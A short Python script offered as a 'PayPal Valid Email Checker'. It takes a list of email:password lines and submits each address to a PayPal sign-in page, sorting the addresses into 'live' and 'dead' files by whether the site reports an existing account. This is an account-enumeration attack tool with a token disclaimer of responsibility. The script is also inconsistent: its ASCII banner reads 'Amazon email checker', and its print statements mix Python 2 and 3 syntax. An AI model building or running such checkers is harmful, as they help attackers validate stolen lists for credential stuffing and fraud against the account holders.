print("PayPal Valid Email Checker")
import requests
live = open('PayPalLive.txt', 'w')
die = open('PayPalDie.txt', 'w')
print ('''      _                                                          _ _        _               _             
    / \   _ __ ___   __ _ _______  _ __     ___ _ __ ___   __ _(_) |   ___| |__   ___  ___| | _____ _ __ 
   / _ \ | '_ ` _ \ / _` |_  / _ \| '_ \   / _ \ '_ ` _ \ / _` | | |  / __| '_ \ / _ \/ __| |/ / _ \ '__|
  / ___ \| | | | | | (_| |/ / (_) | | | | |  __/ | | | | | (_| | | | | (__| | | |  __/ (__|   <  __/ |   
 /_/   \_\_| |_| |_|\__,_/___\___/|_| |_|  \___|_| |_| |_|\__,_|_|_|  \___|_| |_|\___|\___|_|\_\___|_|   
                                                                                                         ''')
Checked = ""
print("_"*50)
print"PayPal Valid Email Checker"
print"I dont't Accept any Responsibility for any illegal usage!"
print("_"*55)
print" "
list=raw_input("Input Mail List :")
link = "https://www.paypal.com/id/signin"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
s = requests.session()
g = s.get(link, headers=head)
list = open(list, 'r')
print("-"*55)
while True:
  email = list.readline().replace('\n','')
  if not email:
    break
  bacot = email.strip().split(':')
  xxx = {'customerName':'Androsex','email': bacot[0],'emailCheck': bacot[0],'password':'Kontol1337','passwordCheck':'Kontol1337'}
  cek = s.post(link, headers=head, data=xxx).text
  if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
    print("\033[32;1mLIVE\033[0m | "+email+" | Checked by Thanos")
    live.write(email + '\n')
  else:
    print("\033[31;1mDIE\033[0m | "+email+" | Checked by Thanos")
    die.write(email + '\n')
print("-"*50)
print("\033[35;1mProccess Checking Done\033[0m")
print("PayPal Valid Email was Saved in PayPalLive.txt")
